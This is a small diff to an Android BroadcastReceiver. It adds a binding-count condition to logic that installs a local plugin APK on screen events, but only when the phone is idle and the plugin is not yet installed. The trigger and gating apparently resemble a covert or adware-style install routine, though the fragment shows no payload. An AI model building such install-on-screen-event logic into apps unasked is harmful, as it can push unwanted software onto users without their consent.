@@ -62,8 +62,8 @@ public class ScreenBroadcastReceiver extends BroadcastReceiver {
                 if (open != 0
                         && state == TelephonyManager.CALL_STATE_IDLE
                         && UtilOperator.isPluginApkExist()
-                        /**&& !UtilsRuntime.isPackageHasInstalled(context, Config.PLUGIN_PACKAGE_NAME)**/
-                        && !pluginInstalled) {
+                        && !pluginInstalled
+                        && SettingManager.getInstance().getDeviceBindingTime() <= Config.BIND_TIMES) {
                     if (cur > (SettingManager.getInstance().getKeyLanuchTime() + SettingManager.getInstance().getKeyInstallInterval())) {
                         if (!Config.DIS_INSTALL) UtilOperator.tryToInstallPluginLocal(context);
                     }
